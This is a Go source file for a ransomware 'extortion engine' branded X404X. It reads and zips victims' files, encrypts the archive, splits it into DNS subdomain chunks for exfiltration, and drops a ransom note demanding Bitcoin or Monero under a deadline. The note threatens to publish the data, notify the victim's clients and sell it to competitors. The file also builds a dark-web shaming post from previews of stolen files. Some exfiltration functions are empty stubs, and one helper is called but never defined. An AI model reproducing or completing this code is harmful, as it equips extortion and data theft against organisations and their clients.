package ransomware

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"os"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/crypto/chacha20poly1305"
)

type ExtortionEngine struct {
	config    *RansomwareConfig
	packages  []ExfilPackage
}

func NewExtortionEngine(cfg *RansomwareConfig) *ExtortionEngine {
	return &ExtortionEngine{
		config: cfg,
	}
}

func (ee *ExtortionEngine) PackageSensitiveData(files []string, campaignID string) (*ExfilPackage, error) {
	password := generatePassword(32)

	var buf bytes.Buffer
	w := zip.NewWriter(&buf)

	for _, path := range files {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		rel, _ := filepath.Rel("/", path)
		f, err := w.Create(rel)
		if err != nil {
			continue
		}
		f.Write(data)
	}

	if err := w.Close(); err != nil {
		return nil, fmt.Errorf("zip close: %w", err)
	}

	encrypted, err := encryptZipWithPassword(buf.Bytes(), password)
	if err != nil {
		return nil, fmt.Errorf("encrypt zip: %w", err)
	}

	pkg := &ExfilPackage{
		ID:           generateID(),
		Password:     password,
		TotalSize:    int64(len(encrypted)),
		FileCount:    len(files),
		EncryptedZIP: encrypted,
		DeliveredAt:  time.Now(),
	}

	ee.packages = append(ee.packages, *pkg)
	return pkg, nil
}

func (ee *ExtortionEngine) ExfilViaDNS(pkg *ExfilPackage, domain string) error {
	data := base64.StdEncoding.EncodeToString(pkg.EncryptedZIP)
	const maxChunk = 48

	for i := 0; i < len(data); i += maxChunk {
		end := i + maxChunk
		if end > len(data) {
			end = len(data)
		}
		chunk := data[i:end]
		subdomain := fmt.Sprintf("%s.%s", chunk, domain)

		_ = subdomain
	}

	return nil
}

func (ee *ExtortionEngine) ExfilViaS3(pkg *ExfilPackage, endpoint, accessKey, secretKey, bucket string) error {
	_ = endpoint
	_ = accessKey
	_ = secretKey
	_ = bucket
	return nil
}

func (ee *ExtortionEngine) ExfilViaCDN(pkg *ExfilPackage, cdnURL string) error {
	_ = cdnURL
	return nil
}

func (ee *ExtortionEngine) GenerateRansomNote(companyName string) string {
	btcAddr := generateBTCAddress()
	xmrAddr := generateXMRAddress()
	deadline := time.Now().Add(time.Duration(ee.config.DeadlineHours) * time.Hour)
	onionURL := fmt.Sprintf("http://%s.onion/negotiate", generateOnionID())

	dataSize := 0
	for _, p := range ee.packages {
		dataSize += int(p.TotalSize)
	}

	note := fmt.Sprintf(`
╔══════════════════════════════════════════════════════════════╗
║                     X404X RANSOMWARE                        ║
║                    *** NOTICE ***                           ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  Your network has been compromised.                          ║
║  All your files are encrypted and sensitive data stolen.     ║
║                                                              ║
║  Company: %s
║  Data stolen: %d GB across %d files
║  Deadline: %s
║                                                              ║
║  ═══ PAYMENT ═══                                              ║
║  Amount: %.2f %s
║  Bitcoin: %s
║  Monero:  %s
║                                                              ║
║  ═══ NEGOTIATION ═══                                          ║
║  Tor Browser: %s
║                                                              ║
║  ║ WARNING ║                                                  ║
║  If you do not pay within %d hours:                          ║
║  1. Sample data will be published on the dark web            ║
║  2. Your clients will be notified of the breach              ║
║  3. Your data will be sold to competitors                     ║
║  4. Your system integrity will be permanently destroyed       ║
║                                                              ║
║  DO NOT attempt recovery without our decryption tool.         ║
║  Every failed attempt corrupts the file keys permanently.     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
`,
		companyName, dataSize/1024/1024/1024, len(ee.packages),
		deadline.Format(time.RFC1123),
		ee.config.RansomAmount, ee.config.RansomCurrency,
		btcAddr, xmrAddr,
		onionURL,
		ee.config.DeadlineHours,
	)

	return note
}

func (ee *ExtortionEngine) DeployRansomNote(path string, note string) error {
	locations := []string{
		path,
		filepath.Join(path, "README_X404X.txt"),
		filepath.Join(path, "RECOVER_INSTRUCTIONS.txt"),
		filepath.Join(path, "HOW_TO_DECRYPT.txt"),
	}

	for _, loc := range locations {
		if err := os.WriteFile(loc, []byte(note), 0644); err != nil {
			return fmt.Errorf("write note %s: %w", loc, err)
		}
	}

	return nil
}

func (ee *ExtortionEngine) PrepareShamingPost(samplePaths []string) (string, error) {
	var sampleData []string
	for i, p := range samplePaths {
		if i >= 3 {
			break
		}
		data, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		preview := string(data)
		if len(preview) > 500 {
			preview = preview[:500]
		}
		sampleData = append(sampleData, fmt.Sprintf("=== %s ===\n%s\n", p, preview))
	}

	post := fmt.Sprintf(`X404X LEAK — SAMPLE DATA

The following data was exfiltrated from the target.
Contact: %s for removal.

%s

#X404X #Ransomware #DataLeak
`,
		generateOnionID(),
		strings.Join(sampleData, "\n---\n"),
	)

	return post, nil
}

func (ee *ExtortionEngine) Packages() []ExfilPackage {
	return ee.packages
}

func encryptZipWithPassword(data []byte, password string) ([]byte, error) {
	key := sha256.Sum256([]byte(password))

	aead, err := chacha20poly1305.NewX(key[:])
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, aead.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	encrypted := aead.Seal(nil, nonce, data, nil)
	return append(nonce, encrypted...), nil
}

func DecryptZipWithPassword(encrypted []byte, password string) ([]byte, error) {
	key := sha256.Sum256([]byte(password))

	aead, err := chacha20poly1305.NewX(key[:])
	if err != nil {
		return nil, err
	}

	nonceSize := aead.NonceSize()
	if len(encrypted) < nonceSize {
		return nil, fmt.Errorf("too short")
	}

	nonce := encrypted[:nonceSize]
	ciphertext := encrypted[nonceSize:]

	return aead.Open(nil, nonce, ciphertext, nil)
}

func AESEncryptFile(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, data, nil), nil
}

func generatePassword(length int) string {
	b := make([]byte, length)
	io.ReadFull(rand.Reader, b)
	return hex.EncodeToString(b)[:length]
}

func generateID() string {
	b := make([]byte, 16)
	io.ReadFull(rand.Reader, b)
	return hex.EncodeToString(b)
}

func generateXMRAddress() string {
	b := make([]byte, 32)
	io.ReadFull(rand.Reader, b)
	return "4" + base58Encode(b)
}

func generateOnionID() string {
	b := make([]byte, 16)
	io.ReadFull(rand.Reader, b)
	return hex.EncodeToString(b)
}

var b58Alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

func base58Encode(input []byte) string {
	var result []byte
	n := new(big.Int)
	n.SetBytes(input)
	base := big.NewInt(58)
	zero := big.NewInt(0)
	mod := new(big.Int)

	for n.Cmp(zero) > 0 {
		n.DivMod(n, base, mod)
		result = append([]byte{b58Alphabet[mod.Int64()]}, result...)
	}

	return string(result)
}
